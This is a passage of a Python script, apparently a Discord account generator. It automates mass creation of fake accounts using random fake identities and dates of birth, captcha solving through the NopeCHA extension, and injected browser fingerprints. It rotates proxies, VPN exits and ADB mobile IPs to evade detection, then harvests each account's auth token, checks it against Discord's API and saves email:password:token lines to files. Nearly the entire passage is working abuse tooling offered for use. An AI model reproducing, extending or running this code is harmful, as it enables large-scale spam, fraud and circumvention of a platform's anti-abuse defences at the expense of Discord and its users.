    nouns = ['Gamer', 'Player', 'User', 'Hero', 'Legend', 'Champion', 'Warrior']
    return f"{random.choice(adjectives)}{random.choice(nouns)}{random.randint(1000, 99999)}"

def generate_password(length: int = 16) -> str:
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    password = ''.join(random.choices(chars, k=length))
    if not any(c.isupper() for c in password):
        password = password[:1].upper() + password[1:]
    if not any(c.isdigit() for c in password):
        password = password[:-1] + str(random.randint(0, 9))
    return password


def generate_form_password(min_length: int = 8) -> str:
    """Generate a strong form password with at least min_length characters."""
    length = max(min_length, 8)
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    password = ''.join(random.choices(chars, k=length))
    if not any(c.isupper() for c in password):
        password = random.choice(string.ascii_uppercase) + password[1:]
    if not any(c.isdigit() for c in password):
        password = password[:-1] + random.choice(string.digits)
    return password

def check_token(token: str, proxy_config: Dict = None) -> str:
    try:
        session = tls_client.Session(client_identifier="chrome_138")
        if proxy_config:
            proxy_dict = get_session_proxy(proxy_config)
            if proxy_dict:
                session.proxies = proxy_dict
        headers = {'Authorization': token}
        response = session.get('https://discordapp.com/api/v9/users/@me/library', headers=headers)
        if response.status_code == 200:
            return 'VALID'
        elif response.status_code == 403:
            return 'LOCKED'
        elif response.status_code == 401:
            return 'INVALID'
        else:
            return 'INVALID'
    except:
        return 'ERROR'

def save_account_to_file(email: str, password: str, token: str, status: str):
    try:
        if status == 'VALID':
            output_file = OUTPUT_DIR / "valid.txt"
        elif status == 'LOCKED':
            output_file = OUTPUT_DIR / "locked.txt"
        else:
            output_file = OUTPUT_DIR / "invalid.txt"
        with LOCK:
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{token}\n")
        
        # Update stats
        with ACCOUNT_STATS_LOCK:
            if status == 'VALID':
                ACCOUNT_STATS['valid'] += 1
            elif status == 'LOCKED':
                ACCOUNT_STATS['locked'] += 1
            elif status == 'INVALID':
                ACCOUNT_STATS['invalid'] += 1
            
            # Calculate totals and percentages
            total = ACCOUNT_STATS['valid'] + ACCOUNT_STATS['invalid'] + ACCOUNT_STATS['locked']
            valid_percent = (ACCOUNT_STATS['valid'] / total * 100) if total > 0 else 0
        
        # Log stats in one line
        stats_msg = f"Valid: {ACCOUNT_STATS['valid']} | Invalid: {ACCOUNT_STATS['invalid']} | Locked: {ACCOUNT_STATS['locked']} | Valid %: {valid_percent:.1f}%"
        log.gradient(stats_msg, "STATS")
    except Exception as e:
        log.error(f"Save failed: {e}")

def check_email_verified_api(token: str, proxy_config: Dict = None):
    try:
        session = tls_client.Session(client_identifier="chrome_138")
        if proxy_config:
            proxy_dict = get_session_proxy(proxy_config)
            if proxy_dict:
                session.proxies = proxy_dict
        headers = {'Authorization': token}
        response = session.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            return response.json().get('verified', False), response.json().get('email', 'N/A')
        return None, None
    except:
        return None, None

# ============================================================================
# FIXED DOB FUNCTION
# ============================================================================

async def fill_date_of_birth(page):
    """Fill date of birth dropdowns - INSTANT"""
    
    months = ["January", "February", "March", "April", "May", "June",
              "July", "August", "September", "October", "November", "December"]
    day = str(random.randint(1, 28))
    month = random.choice(months)
    year = str(random.randint(1998,2004))
    
    try:
        result = await page.evaluate(f'''
        (async () => {{
            async function setDobField(label, value) {{
                const el = document.querySelector(`div[aria-label="${{label}}"]`);
                if (!el) return false;
                el.click();
                await new Promise(r => setTimeout(r, 100));
                
                // Type the value out so the combobox highlights it
                for (let i = 0; i < value.length; i++) {{
                    const char = value[i];
                    document.activeElement.dispatchEvent(new KeyboardEvent('keydown', {{
                        key: char,
                        code: isNaN(char) ? 'Key' + char.toUpperCase() : 'Digit' + char,
                        keyCode: char.toUpperCase().charCodeAt(0),
                        bubbles: true
                    }}));
                    await new Promise(r => setTimeout(r, 50));
                }}
                
                await new Promise(r => setTimeout(r, 100));
                
                // Press Enter to select
                document.activeElement.dispatchEvent(new KeyboardEvent('keydown', {{
                    key: 'Enter',
                    code: 'Enter',
                    keyCode: 13,
                    bubbles: true
                }}));
                
                await new Promise(r => setTimeout(r, 100));
                return true;
            }}

            const m = await setDobField("Month", "{month}");
            if (!m) return {{ success: false, error: "Month field not found" }};
            
            const d = await setDobField("Day", "{day}");
            if (!d) return {{ success: false, error: "Day field not found" }};
            
            const y = await setDobField("Year", "{year}");
            if (!y) return {{ success: false, error: "Year field not found" }};
            
            // Close any lingering dropdowns by clicking the body
            document.body.click();
            await new Promise(r => setTimeout(r, 150));
            
            // Aggressively find and click the Continue/Create button
            const buttons = document.querySelectorAll('button');
            for (const btn of buttons) {{
                const text = btn.textContent || '';
                if (text.includes('Continue') || text.includes('Create') || text.includes('Submit') || text.includes('Register')) {{
                    btn.click();
                    break;
                }}
            }}
            
            return {{ success: true }};
        }})()
        ''')

        if result and isinstance(result, dict) and result.get('success'):
            log.success(f"DOB: {month} {day}, {year}")
        else:
            log.gradient(f"DOB failed: {result}", "DEBUG")

    except Exception as e:
        log.debug(f"DOB error: {e}")


# ============================================================================
# REGISTRATION FORM FILLING
# ============================================================================

async def fill_registration_form(page, email: str, display_name: str, username: str, password: str) -> bool:
    try:
        # Filling form
        
        email_element = await page.wait_for('input[name="email"]', timeout=10000)
        await email_element.send_keys(email)
        await asyncio.sleep(0.1)
        
        display_element = await page.wait_for('input[name="global_name"]', timeout=5000)
        await display_element.send_keys(display_name)
        await asyncio.sleep(0.1)
        
        username_element = await page.wait_for('input[name="username"]', timeout=5000)
        await username_element.send_keys(username)
        await asyncio.sleep(0.1)
        
        # Try multiple selectors for password field
        password_element = None
        selectors = [
            'input[aria-label="Password"]',
            'input[name="password"]',
            'input[type="password"]'
        ]
        
        for selector in selectors:
            try:
                password_element = await page.query_selector(selector)
                if password_element:
                    break
            except:
                continue
        
        if password_element:
            await password_element.send_keys(password)
            await asyncio.sleep(0.2)
        else:
            pass
        
        await asyncio.sleep(0.2)
        await fill_date_of_birth(page)
        await asyncio.sleep(0.1)
        
        try:
            await page.evaluate(JS_UTILS)
            await asyncio.sleep(0.1)
            result = await page.evaluate('window.utils.clickAllCheckboxes()')
            if result and result.get('clicked', 0) > 0:
                log.success(f"✓ Clicked {result.get('clicked')} checkbox(es)")
        except Exception as e:
            pass
        
        clicked = False
        await asyncio.sleep(0.3)
        
        try:
            buttons = await page.query_selector_all('button')
            for button in buttons:
                try:
                    text = await button.get('textContent') or ""
                    if text and any(keyword in text for keyword in ['Continue', 'Create', 'Submit', 'Register']):
                        await button.click()
                        clicked = True
                        break
                except:
                    continue
        except:
            pass
        
        if not clicked:
            try:
                submit = await page.query_selector('[type="submit"]')
                if submit:
                    await submit.click()
                    clicked = True
            except:
                pass
        
        if not clicked:
            try:
                clicked = await page.evaluate('''() => {
                    const buttons = document.querySelectorAll('button');
                    for (const btn of buttons) {
                        const text = btn.textContent || '';
                        if (text.includes('Continue') || text.includes('Create') || text.includes('Submit')) {
                            btn.click();
                            return true;
                        }
                    }
                    return false;
                }''')
                if clicked:
                    log.success("Clicked submit via evaluate")
            except:
                pass
        
        if not clicked:
            log.error("Could not find submit button")
            return False
        
        return True
        
    except Exception as e:
        log.error(f"Form fill error: {e}")
        return False

# ============================================================================
# WAIT FOR ACCOUNT CREATION
# ============================================================================

async def wait_for_account_creation(page, timeout: int = 300) -> bool:
    start_time = time.time()
    last_url = ""

    while (time.time() - start_time) < timeout:
        await asyncio.sleep(0.5)

        try:
            try:
                current_url = await page.evaluate('window.location.href')
                if hasattr(current_url, 'value'):
                    current_url = current_url.value or ""
                elif isinstance(current_url, tuple):
                    current_url = str(current_url[0]) if current_url[0] else ""
                else:
                    current_url = str(current_url) if current_url else ""
            except Exception:
                current_url = ""

            if current_url and current_url != last_url:
                # URL check
                last_url = current_url

            if not current_url:
                continue

            skip = ['discord.com/register', 'discord.com/login', 'about:blank', 'chrome://']
            if 'discord.com' in current_url and not any(s in current_url for s in skip):
                log.orange_gradient("Captcha solved")
                return True

        except Exception as e:
            pass

    log.error("Timeout waiting for account creation")
    return False

# ============================================================================
# TOKEN EXTRACTION
# ============================================================================

async def wait_for_discord_token(page, timeout: int = 30, email: str = None, password: str = None, proxy_config: Dict = None):
    # Fetching token
    
    if not email or not password:
        log.error("Email and password required")
        return None
    
    await asyncio.sleep(3)
    
    attempts = 0
    max_attempts = 5
    
    while attempts < max_attempts:
        attempts += 1
        try:
            token = await fetch_discord_token(email, password, proxy_config)
            if token:
                return token
            else:
                pass
        except Exception as e:
            pass
        
        await asyncio.sleep(3)
    
    log.error("Could not fetch token")
    return None


async def worker(worker_id: int, proxy_config: Dict = None, fingerprint: str = None):
    global SESSION_CREATED, SESSION_STOP, ACTIVE_WORKERS

    if SESSION_STOP:
        if fingerprint:
            release_fingerprint(fingerprint)
        return

    with WORKER_LOCK:
        ACTIVE_WORKERS += 1

    browser = None
    temp_profile = None
    fingerprint_removed = False
    current_fingerprint = None

    try:
        # Worker starting

        if MULLVAD_AVAILABLE:
            if config.get("mullvad", {}).get("auto_login", False):
                if not mullvad_auto_login_recent_account():
                    log.error("Mullvad auto-login aborted because the recent account is revoked or invalid")
                    return
            country = config.get("mullvad", {}).get("country", "us")
            if not mullvad_rotate(country):
                log.error(f"Mullvad rotate failed, skipping")
                return
        elif URBANVPN_AVAILABLE:
            country = config.get("urbanvpn", {}).get("server", "us")
            if not urbanvpn_rotate(country):
                log.error(f"UrbanVPN rotate failed, skipping")
                return

        first_names = ['Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Sam', 'Blake', 'Drew', 'Avery', 'Jamie', 'Parker', 'Cameron', 'Dakota', 'Skyler', 'Quinn', 'Reese', 'Sage', 'River', 'Phoenix', 'Devon', 'Adrian', 'Bailey', 'Chase', 'Dakota', 'Ellis', 'Finley', 'Gray', 'Harper', 'Indigo', 'Jackie', 'Kennedy', 'Logan', 'Morgan', 'Noah', 'Ocean', 'Paris', 'Quinn', 'Robin', 'Sage', 'Taylor', 'Union', 'Vale', 'Wade', 'Xander', 'York', 'Zephyr', 'Aaron', 'Benjamin', 'Christopher', 'Daniel', 'Edward', 'Frank', 'George', 'Henry', 'Isaac', 'James', 'Kevin', 'Leonard', 'Michael', 'Nathan', 'Oliver', 'Patrick', 'Quinn', 'Robert', 'Steven', 'Thomas', 'Ulysses', 'Victor', 'William', 'Xavier', 'Yuki', 'Zachary', 'Alice', 'Bella', 'Charlotte', 'Diana', 'Elena', 'Fiona', 'Grace', 'Hannah', 'Iris', 'Jessica', 'Katherine', 'Laura', 'Michelle', 'Nancy', 'Olivia', 'Paige', 'Quinley', 'Rachel', 'Sophia', 'Tessa', 'Ursula', 'Victoria', 'Wendy', 'Ximena', 'Yasmine', 'Zoe']
        surnames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Wilson', 'Anderson', 'Taylor', 'Thomas', 'Moore', 'Jackson', 'Martin', 'Lee', 'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark', 'Ramirez', 'Lewis', 'Robinson', 'Walker', 'Young', 'Allen', 'King', 'Wright', 'Lopez', 'Hill', 'Scott', 'Green', 'Adams', 'Nelson', 'Carter', 'Roberts', 'Edwards', 'Collins', 'Reeves', 'Morris', 'Murphy', 'Rogers', 'Morgan', 'Peterson', 'Cooper', 'Reed', 'Bell', 'Gomez', 'Murray', 'Freeman', 'Wells', 'Webb', 'Simpson', 'Stevens', 'Tucker', 'Porter', 'Hunter', 'Hicks', 'Crawford', 'Henry', 'Boyd', 'Mason', 'Moreno', 'Kennedy', 'Warren', 'Dixon', 'Ramos', 'Reeves', 'Burns', 'Gordon', 'Shaw', 'Holmes', 'Rice', 'Robertson', 'Hunt', 'Black', 'Daniels', 'Palmer', 'Mills', 'Nicholson', 'Grant', 'Knight', 'Ferguson', 'Stone', 'Hawkins', 'Dunn', 'Perkins', 'Hudson', 'Spencer', 'Gardner', 'Stephens', 'Payne', 'Pierce', 'Berry', 'Matthews', 'Arnold', 'Wagner', 'Willis', 'Ray', 'Watkins', 'Olson', 'Carroll', 'Duncan', 'Snyder', 'Hart', 'Cunningham', 'Knight', 'Chase', 'Wyatt']
        
        # Generate real name-based credentials
        first_name = random.choice(first_names).lower()
        last_name = random.choice(surnames).lower()
        display_name = first_name.capitalize() + ' ' + last_name.capitalize()
        
        # Discord username based on first name + suffix + numbers (e.g., "alexgoturback789")
        username_suffixes = ['goturback', 'alltake', 'isdone', 'nowake', 'makeit', 'bestme', 'allset', 'isgood', 'letgo', 'final']
        discord_username = f"{first_name}{random.choice(username_suffixes)}{random.randint(100, 999)}"
        
        email, email_password, email_token, email_uuid, email_provider = get_email_from_provider(config)
        if not email:
            log.error(f"Failed to get email")
            return
        
        account_password = email_password or generate_form_password(10)
        log.gradient_success(f"Email: {log.mask_email(email)}")
        
        temp_profile = tempfile.mkdtemp()
        browser_args = [
            f'--user-data-dir={temp_profile}',
            
            '--disable-backgrounding-occluded-windows',
            '--disable-background-timer-throttling',
            '--disable-renderer-backgrounding',
            '--disable-throttling',
            
            '--no-first-run',
            '--disable-default-apps',
            '--disable-features=IsolateOrigins,site-per-process,ChromeWhatsNewUI',
            '--disable-dev-shm-usage',
            '--disable-breakpad',
            '--disable-component-extensions-with-background-pages',
            '--disable-features=TranslateUI,MediaRouter,OptimizationHints',
            '--disable-domain-reliability',
            
            '--window-size=400,500',
            
            '--window-position=0,0',
            '--force-device-scale-factor=1',
        ]
        
        if proxy_config and not MULLVAD_AVAILABLE:
            browser_args.extend(get_browser_proxy_args(proxy_config))

        if NOPECHA_EXT_DIR.exists():
            browser_args.append(f'--load-extension={NOPECHA_EXT_DIR}')
        
        current_key = get_current_nopecha_key()
        injected_key = False
        if current_key:
            injected_key = inject_nopecha_key(current_key)
        
        current_fingerprint = fingerprint
        if current_fingerprint:
            install_num = get_fingerprint_installation_number(current_fingerprint)
            fp_value = get_fingerprint_value(current_fingerprint)
            install_id = get_fingerprint_installation_id(current_fingerprint)
            fingerprint_label = f"Fingerprint#{install_num}" if install_num else "Fingerprint"
            fingerprint_text = f" {log.mask_fingerprint(fp_value or current_fingerprint)}"
            if install_id:
                fingerprint_text += f" (install {install_id})"
            if injected_key:
                log.gradient_info(f"{fingerprint_text}")
            else:
                log.gradient_info(fingerprint_text)
        
        browser = await uc.start(
            headless=False,
            browser_executable_path=BRAVE_PATH if BRAVE_PATH else None,
            browser_args=browser_args,
        )
        
        # Setup proxy authentication handler if needed
        if proxy_config and proxy_config.get('username'):
            await setup_proxy_auth(browser, proxy_config)
        
        page = await browser.get("https://discord.com/register")
        if not page:
            log.error(f"Could not get page")
            return

        if current_fingerprint:
            injected_fp = await inject_fingerprint_to_page(page, current_fingerprint)
            if injected_fp:
                log.gradient_success("Fingerprint metadata injected into page storage")
            else:
                log.warning("Fingerprint injection failed")

        if not page:
            log.error(f"Could not get page")
            return
        
        for _ in range(30):
            try:
                if await page.query_selector('input[name="email"]'):
                    break
            except:
                pass
            await asyncio.sleep(0.5)
        
        await asyncio.sleep(1)
        
        success = await fill_registration_form(page, email, display_name, discord_username, account_password)
        if not success:
            log.error(f"Form fill failed")
            return
        
        # Waiting for account
        created = await wait_for_account_creation(page)
        
        if not created:
            log.error(f"Creation failed")
            return

        # Getting token
        token = await wait_for_discord_token(page, email=email, password=account_password, proxy_config=proxy_config)
        
        if token:
            if token.startswith('"') and token.endswith('"'):
                token = token[1:-1]

            token_match = re.search(r'([a-zA-Z0-9_-]{20,})\.([a-zA-Z0-9_-]{6})\.([a-zA-Z0-9_-]{27,})', token)
            if token_match:
                token = f"{token_match.group(1)}.{token_match.group(2)}.{token_match.group(3)}"
            
            log.purple_white_gradient(f"Account Genned > {log.mask_token(token)}")
            
            if email_provider in ["hotmail007", "zeusx"]:
                verified = await verify_email_hotmail007(
                    email, email_token, email_uuid, browser, token, proxy_config
                )
                if verified:
                    log.success(f"Email verified!")
                    with ACCOUNT_STATS_LOCK:
                        ACCOUNT_STATS['verified'] += 1
                    with ACCOUNT_STATS_LOCK:
                        ACCOUNT_STATS['captcha_ok'] += 1
                else:
                    log.warning(f"Email verification failed")
                    with ACCOUNT_STATS_LOCK:
                        ACCOUNT_STATS['captcha_fail'] += 1
            elif email_provider == "leveragers":
                api_key = config.get("email_provider", {}).get("api_key", "").strip()
                verified = await verify_email_leveragers(
                    email, email_password, browser, token, api_key
                )
                if verified:
                    log.success(f"Email verified!")
                    with ACCOUNT_STATS_LOCK:
                        ACCOUNT_STATS['verified'] += 1
                    with ACCOUNT_STATS_LOCK:
                        ACCOUNT_STATS['captcha_ok'] += 1
                else:
                    with ACCOUNT_STATS_LOCK:
                        ACCOUNT_STATS['captcha_fail'] += 1
            elif email_provider == "mailcow":
                verified = await verify_email_mailcow(
                    email, email_password, browser, token, config
                )
                if verified:
                    log.success(f"Email verified!")
                    with ACCOUNT_STATS_LOCK:
                        ACCOUNT_STATS['verified'] += 1
                    with ACCOUNT_STATS_LOCK:
                        ACCOUNT_STATS['captcha_ok'] += 1
                else:
                    with ACCOUNT_STATS_LOCK:
                        ACCOUNT_STATS['captcha_fail'] += 1
            elif email_provider == "public temp inbox":
                api_key = config.get("email_provider", {}).get("api_key", "").strip()
                domain = config.get("email_provider", {}).get("domain", "durudraxon.online")
                api_base = config.get("email_provider", {}).get("api_base", "https://mail.draxono.in")
                verified = await verify_email_public_temp_inbox(
                    email, email_password, browser, token, api_key, domain, api_base
                )
                if verified:
                    log.success(f"Email verified!")
                    with ACCOUNT_STATS_LOCK:
                        ACCOUNT_STATS['verified'] += 1
                    with ACCOUNT_STATS_LOCK:
                        ACCOUNT_STATS['captcha_ok'] += 1
                else:
                    with ACCOUNT_STATS_LOCK:
                        ACCOUNT_STATS['captcha_fail'] += 1
            
            result = check_token(token, proxy_config)
            log.token_status(result)
            save_account_to_file(email, account_password, token, result)
            
            if current_fingerprint:
                install_num = get_fingerprint_installation_number(current_fingerprint)
                fingerprint_label = f"Fingerprint#{install_num}" if install_num else "Fingerprint"
                consume_fingerprint(current_fingerprint)
                fingerprint_removed = True
                log.info(f"Consumed {fingerprint_label} for token: {log.mask_fingerprint(current_fingerprint)}")

            with LOCK:
                SESSION_CREATED += 1
                created_now = SESSION_CREATED

            
            # ADB IP rotation after account creation
            if ADB_ENABLED:
                # Debug: show adb state before attempting rotation
                try:
                    log.gradient_info(f"ADB_ENABLED={ADB_ENABLED} ADB_DEVICE={ADB_DEVICE} ADB_BINARY={ADB_BINARY}")
                except Exception:
                    pass

                if adb_change_ip():
                    # Fetch public IP and display previous->current if possible
                    try:
                        new_ip = get_public_ip()
                        global ADB_LAST_IP
                        if new_ip:
                            if ADB_LAST_IP and ADB_LAST_IP != new_ip:
                                log.gradient_info(f"IP changed: {ADB_LAST_IP} -> {new_ip}")
                            else:
                                log.gradient_info(f"IP: {new_ip}")
                            ADB_LAST_IP = new_ip
                        else:
                            log.warning("Could not fetch public IP after ADB rotation")
                    except Exception:
                        log.warning("Error fetching public IP after ADB rotation")
                else:
                    log.warning(f"ADB IP rotation failed")
            
            if SESSION_TARGET > 0 and created_now >= SESSION_TARGET:
                with LOCK:
                    SESSION_STOP = True
        else:
            pass
            
    except StopIteration:
        log.warning("Worker stopped due to StopIteration")
    except Exception as e:
        log.error(f"Error: {e}")
    
    finally:
        if not fingerprint_removed and current_fingerprint:
            release_fingerprint(current_fingerprint)
        if browser:
            try:
                await browser.stop()
            except:
                pass
        if temp_profile and os.path.exists(temp_profile):
            try:
                shutil.rmtree(temp_profile, ignore_errors=True)
            except:
                pass
        with WORKER_LOCK:
            ACTIVE_WORKERS -= 1

# ============================================================================
# BATCH COOLDOWN
# ============================================================================

async def batch_cooldown(batch_size: int, accounts_created: int):
    if accounts_created == 0:
        return
    # Cooldown active - queue logs disabled
    for remaining in range(COOLDOWN_SECONDS, 0, -1):
        await asyncio.sleep(1)

# ============================================================================
# RUN WORKERS
# ============================================================================

async def run_workers():
    global SESSION_TARGET, SESSION_CREATED, SESSION_STOP, PROXY_LIST
    
    all_proxies = load_proxies(config)
    with PROXY_LIST_LOCK:
        PROXY_LIST = all_proxies if all_proxies else []
    
    while not SESSION_STOP:
        with LOCK:
            if SESSION_TARGET > 0 and SESSION_CREATED >= SESSION_TARGET:
                SESSION_STOP = True
                break
        
        accounts_before = SESSION_CREATED
        remaining = SESSION_TARGET - SESSION_CREATED if SESSION_TARGET > 0 else THREAD_COUNT
        batch_size = min(THREAD_COUNT, remaining) if SESSION_TARGET > 0 else THREAD_COUNT
        
        if batch_size <= 0 and SESSION_TARGET > 0:
            break
        
        tasks = []
        for i in range(batch_size):
            worker_id = random.randint(10000, 99999)
            # Select random proxy for each thread
            current_proxy = get_random_proxy()
            rotate_nopecha_key()
            fingerprint = reserve_fingerprint()
            tasks.append(asyncio.create_task(worker(worker_id, current_proxy, fingerprint)))
        
        # Starting batch
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        accounts_created = SESSION_CREATED - accounts_before
        
        if SESSION_TARGET > 0:
            if SESSION_CREATED < SESSION_TARGET:
                await batch_cooldown(batch_size, accounts_created)
        else:
            await batch_cooldown(batch_size, accounts_created)
        
        await asyncio.sleep(0.1)
    
    log.success(f"Completed! Created {SESSION_CREATED} account(s)")

# ============================================================================
# TAMPON GHOST BANNER
# ============================================================================

def show_tampon_banner(ip: str = None, threads: int = None):
    """Display startup banner with IP and threads info"""
    info_line = "NEO EVs GEN , tg = areugay69"
    if threads:
        info_line += f" | Threads : {threads}"
    if ip:
        info_line += f" | IP : {log.mask_ip(ip)}"
    
    banner = f"{info_line}"
    print(banner)

# ============================================================================
# MAIN FUNCTION
# ============================================================================

async def main():
    global SESSION_TARGET, console_ui
    
    # Initialize console UI for title updates
    console_ui = ConsoleUI(log, refresh=0.5)
    console_ui.start()
    
    # Show the spooky Tampon banner after VPN connect
    current_ip = None

    if MULLVAD_AVAILABLE:
        current_ip = mullvad_get_ip()
    elif URBANVPN_AVAILABLE:
        urbanvpn_config = config.get("urbanvpn", {})
        server = urbanvpn_config.get("server", "us")
        if not urbanvpn_connect(server):
            log.error(f"UrbanVPN connect failed for server: {server}")
            return
        current_ip = get_public_ip()
        if current_ip:
            log.success(f"UrbanVPN connected and IP obtained: {log.mask_ip(current_ip)}")
        else:
            log.warning("UrbanVPN connected but public IP could not be verified")
    else:
        current_ip = get_public_ip()

    # Show the spooky Tampon banner
    show_tampon_banner(ip=current_ip, threads=THREAD_COUNT)

    # Show balance and stock at the top
    show_balance_and_stock()

    provider = config.get("email_provider", {}).get("name", "")
    # Provider, Threads, Cooldown info
    
    SESSION_TARGET = 0
    
    if SESSION_TARGET == 0:
        # INFINITE mode
        pass
    else:
        # FIXED mode
        pass
    print()
    
    download_nopecha_ext()
    
    all_proxies = load_proxies(config)
    if all_proxies:
        # Proxies loaded
        pass
    else:
        # Direct connection
        pass
    
    try:
        await run_workers()
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Stopped{RESET}")
    except Exception as e:
        log.error(f"Error: {e}")
    finally:
        # Stop console UI
        if console_ui:
            console_ui.stop()
        
        # Print final stats
        stats = get_account_stats()
        if stats['total'] > 0:
            final_stats = f"{CYAN}FINAL STATS{RESET} | {GREEN}Valid: {stats['valid']}{RESET} | {RED}Invalid: {stats['invalid']}{RESET} | {YELLOW}Locked: {stats['locked']}{RESET} | {GREEN}Valid %: {stats['valid_percent']}{RESET}"
            print(f"\n{final_stats}\n")